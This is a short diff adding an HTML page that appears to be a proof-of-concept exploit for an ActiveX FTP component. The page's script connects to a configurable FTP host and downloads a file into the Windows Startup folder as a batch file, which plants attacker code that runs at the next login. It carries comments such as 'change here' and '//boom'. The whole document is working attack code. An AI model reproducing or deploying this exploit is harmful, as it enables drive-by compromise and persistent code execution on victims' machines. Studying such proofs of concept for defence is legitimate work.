@@ -1,0 +1,17 @@
+&lt;html&gt;
+&lt;object classid=&#039;clsid:302124C4-30A0-484A-9C7A-B51D5BA5306B&#039; id=&#039;obj&#039; /&gt;
+&lt;/object&gt;
+&lt;script&gt;
+obj.UnlockComponent(&quot;suntzu&quot;); //needed for file transfer operations, type whatever here
+obj.Port=21; //configure ftp connection
+obj.Hostname=&quot;192.168.0.1&quot;; //change here
+obj.ConnectTimeout=5;
+obj.Passive=1;
+var x;
+x=obj.Connect();
+if (x==1){
+x = obj.GetFile(&quot;suntzu.txt&quot;,&quot;c:/Users/All Users/Microsoft/Windows/Start Menu/Programs/Startup/suntzu.bat&quot;); //boom
+}
+obj.Disconnect();
+&lt;/script&gt;
+&lt;/html&gt;
